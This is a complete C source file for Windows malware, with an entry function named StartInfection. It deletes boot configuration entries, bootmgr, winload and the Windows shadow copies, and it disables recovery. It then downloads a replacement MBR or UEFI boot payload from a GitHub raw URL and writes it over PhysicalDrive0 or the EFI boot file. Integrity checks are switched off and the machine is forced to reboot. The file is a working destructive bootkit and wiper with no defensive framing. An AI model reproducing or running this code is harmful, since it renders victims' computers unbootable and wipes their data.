#include <windows.h>
#include <winioctl.h>
#include <stdio.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdlib.h>
#include <string.h>
#include <urlmon.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "urlmon.lib")

#define MBR_URL   "https://raw.githubusercontent.com/PisunBobraHacker/MEMX/main/mbr_disk.bin"
#define UEFI_URL  "https://raw.githubusercontent.com/PisunBobraHacker/MEMX/main/uefi.bin"

typedef struct {
    unsigned char* data;
    unsigned int   size;
} BinaryData;

static BinaryData DownloadBinary(const char* url) {
    BinaryData result = {NULL, 0};
    char tempPath[MAX_PATH], tempFile[MAX_PATH];

    GetTempPathA(MAX_PATH, tempPath);
    sprintf_s(tempFile, sizeof(tempFile), "%sMEMX_%lu.bin", tempPath, GetTickCount());

    if (URLDownloadToFileA(NULL, url, tempFile, 0, NULL) != S_OK)
        return result;

    FILE* f = fopen(tempFile, "rb");
    if (!f) { DeleteFileA(tempFile); return result; }

    fseek(f, 0, SEEK_END);
    result.size = ftell(f);
    fseek(f, 0, SEEK_SET);

    if (result.size == 0) { fclose(f); DeleteFileA(tempFile); return result; }

    result.data = (unsigned char*)malloc(result.size);
    if (!result.data) { fclose(f); DeleteFileA(tempFile); result.size = 0; return result; }

    fread(result.data, 1, result.size, f);
    fclose(f);
    DeleteFileA(tempFile);
    return result;
}

static bool IsUEFIActive(void) {
    FIRMWARE_TYPE ft;
    if (GetFirmwareType(&ft)) return (ft == FirmwareTypeUefi);
    return false;
}

static bool EnablePrivilege(void) {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return false;

    TOKEN_PRIVILEGES tp;
    LUID luid;
    if (!LookupPrivilegeValueA(NULL, SE_BACKUP_NAME, &luid)) {
        CloseHandle(hToken);
        return false;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    BOOL ok = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(hToken);
    return ok && GetLastError() == ERROR_SUCCESS;
}

static void KillBootData(void) {
    system("bcdedit /delete {bootmgr} /f 2>nul");
    system("bcdedit /delete {default} /f 2>nul");
    system("bcdedit /delete {current} /f 2>nul");
    system("attrib -h -s -r C:\\boot\\BCD 2>nul");
    system("del /f /q C:\\boot\\BCD 2>nul");
    system("attrib -h -s -r C:\\bootmgr 2>nul");
    system("del /f /q C:\\bootmgr 2>nul");
    system("attrib -h -s -r C:\\Windows\\System32\\winload.exe 2>nul");
    system("del /f /q C:\\Windows\\System32\\winload.exe 2>nul");
    system("attrib -h -s -r C:\\Windows\\System32\\winload.efi 2>nul");
    system("del /f /q C:\\Windows\\System32\\winload.efi 2>nul");
    system("vssadmin delete shadows /all /quiet 2>nul");
    system("bcdedit /set {default} recoveryenabled No 2>nul");
    system("bcdedit /set {current} recoveryenabled No 2>nul");
}

static bool WriteMBR(const unsigned char* data, unsigned int size) {
    if (size < 512) return false;

    HANDLE hDisk = CreateFileA("\\\\.\\PhysicalDrive0",
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL, OPEN_EXISTING, 0, NULL);

    if (hDisk == INVALID_HANDLE_VALUE) return false;

    DeviceIoControl(hDisk, FSCTL_LOCK_VOLUME, NULL, 0, NULL, 0, NULL, NULL);

    DWORD written = 0;
    SetFilePointer(hDisk, 0, NULL, FILE_BEGIN);
    BOOL ok = WriteFile(hDisk, data, size, &written, NULL);
    FlushFileBuffers(hDisk);

    DeviceIoControl(hDisk, FSCTL_UNLOCK_VOLUME, NULL, 0, NULL, 0, NULL, NULL);
    CloseHandle(hDisk);

    return ok && written == size;
}

static bool WriteESP(const unsigned char* data, unsigned int size) {
    if (!data || size == 0) return false;

    system("mountvol S: /S 2>nul");
    Sleep(1000);
    if (GetFileAttributesA("S:\\") == INVALID_FILE_ATTRIBUTES) return false;

    system("del /f /q S:\\EFI\\Boot\\bootx64.efi 2>nul");
    system("del /f /q S:\\EFI\\Microsoft\\Boot\\bootmgfw.efi 2>nul");
    system("del /f /q S:\\EFI\\Microsoft\\Boot\\bootmgr.efi 2>nul");

    CreateDirectoryA("S:\\EFI", NULL);
    CreateDirectoryA("S:\\EFI\\Boot", NULL);

    system("bcdedit /set {bootmgr} nointegritychecks Yes 2>nul");
    system("bcdedit /set {current} nointegritychecks Yes 2>nul");

    HANDLE hFile = CreateFileA("S:\\EFI\\Boot\\bootx64.efi",
        GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
        FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, NULL);

    if (hFile == INVALID_HANDLE_VALUE) return false;

    DWORD written = 0;
    BOOL ok = WriteFile(hFile, data, size, &written, NULL);
    CloseHandle(hFile);

    return ok && written == size;
}

void StartInfection(void) {
    Sleep(120000);

    EnablePrivilege();
    KillBootData();

    if (IsUEFIActive()) {
        BinaryData uefi = DownloadBinary(UEFI_URL);
        if (uefi.data) { WriteESP(uefi.data, uefi.size); free(uefi.data); }
    } else {
        BinaryData mbr = DownloadBinary(MBR_URL);
        if (mbr.data) { WriteMBR(mbr.data, mbr.size); free(mbr.data); }
    }

    ExitWindowsEx(EWX_REBOOT | EWX_FORCE, 0);
}